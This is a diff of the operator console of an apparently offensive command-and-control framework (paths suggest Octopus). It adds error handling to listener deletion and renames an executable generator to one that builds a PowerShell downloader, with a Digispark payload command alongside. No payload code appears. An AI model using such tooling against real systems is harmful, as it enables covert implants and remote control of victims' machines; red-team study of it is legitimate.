@@ -63,12 +63,6 @@ while True:
                 print(colored("[-] Wrong listener selected !", "red"))
                 continue
 
-        # delete_listener
-
-        # TBD
-        # if command.split(" ")[0] == "delete_listener":
-        #    listener = listeners_information[int(command.split(" ")[1])]
-        #    delete(listener[0], int(command.split(" ")[1]))
 
         if command == "clear":
             os.system("clear")
@@ -104,9 +98,15 @@ while True:
 
         if command.split(" ")[0] == "delete_listener":
             try:
-                listener = command.split(" ")[1]
-                delete_listener(listener)
-            except KeyError:
+                try:
+                    listener = command.split(" ")[1]
+                    delete_listener(listener)
+                except IndexError:
+                    print(colored("[-] Please select a listener !", "red"))
+                    print(colored("Syntax :  delete_listener listener_name", "green"))
+                    print(colored("Example : delete_listener listener1", "yellow"))
+
+            except:
                 print(colored("[-] Wrong listener selected !", "red"))
                 continue
 
@@ -137,14 +137,14 @@ while True:
                 print(colored("[-] Wrong listener selected !", "red"))
                 continue
 
-        if command.split(" ")[0] == "generate_exe":
+        if command.split(" ")[0] == "generate_unmanaged_exe":
             try:
                 listener = command.split(" ")[1]
                 exe_path = command.split(" ")[2]
             except IndexError:
                 print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_exe listener_name output_path", "green"))
-                print(colored("Example : generate_exe listener1 /opt/Octopus/file.exe", "yellow"))
+                print(colored("Syntax :  generate_unmanaged_exe listener_name output_path", "green"))
+                print(colored("Example : generate_unmanaged_exe listener1 /opt/Octopus/file.exe", "yellow"))
                 continue
 
             try:
@@ -158,10 +158,11 @@ while True:
                 else:
                     proto_to_use = "http"
 
-                generate_exe(hostname, path, proto_to_use, exe_path)
+                generate_exe_powershell_downloader(hostname, path, proto_to_use, exe_path)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
                 continue
+
 # generate_digispark
         if command.split(" ")[0] == "generate_digispark":
             try:
@@ -326,6 +327,7 @@ while True:
                             if check_listener_port(ip, port):
                                 listener.start_listener()
                                 listener.create_path()
+                                listeners=listener
                                 print(colored("[+]%s Listener has been created" % listener_name, "green"))
                             else:
                                 print(colored("[+] Port in use or you don't have permession to bind", "red"))
